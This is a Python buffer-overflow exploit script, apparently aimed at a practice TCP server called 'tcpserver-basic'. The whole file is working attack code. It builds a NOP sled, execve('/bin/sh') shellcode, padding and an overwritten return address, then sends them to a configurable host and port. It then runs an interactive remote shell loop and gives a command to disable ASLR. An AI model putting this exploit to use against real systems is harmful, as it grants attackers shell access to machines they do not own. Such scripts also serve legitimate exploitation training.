#!/usr/bin/python3

import socket
import struct

def create_payload(buffer_size=1024):
    # NOP sled
    nop_sled = b"\x90" * 32
    
    # Shellcode - execve("/bin/sh") - 48 bytes
    shellcode = (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        b"\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
        b"\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
    )
        
    # Calculate padding needed
    padding_size = buffer_size - len(nop_sled) - len(shellcode)
    padding = b"A" * padding_size
    
    # Return address to overwrite EIP - points to the NOP sled
    # This address needs to be adjusted based on your environment
    ret_addr = struct.pack("<I", 0xbffff5c0)  # Example address - will need to be adjusted
    
    # Construct final payload
    payload = nop_sled + shellcode + padding + ret_addr
    return payload

def send_exploit(host, port):
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to target
            print(f"[*] Connecting to {host}:{port}")
            s.connect((host, port))
            
            # Send payload
            print("[*] Sending exploit payload...")
            payload = create_payload()
            s.send(payload)
            
            print("[*] Exploit sent successfully!")
            
            # Try to interact with shell
            while True:
                # Send commands
                command = input("shell> ")
                if command.lower() == 'exit':
                    break
                s.send(command.encode() + b'\n')
                
                # Get output
                response = s.recv(4096)
                print(response.decode())
                
        except Exception as e:
            print(f"[!] Error: {str(e)}")
        finally:
            s.close()

if __name__ == "__main__":
    target_host = "127.0.0.1"
    target_port = 9999  # Change this to match your target port
    
    print("Basic Buffer Overflow Exploit for tcpserver-basic")
    print("-------------------------------------------")
    print("[!] Remember to disable ASLR with: echo 0 > /proc/sys/kernel/randomize_va_space")
    send_exploit(target_host, target_port)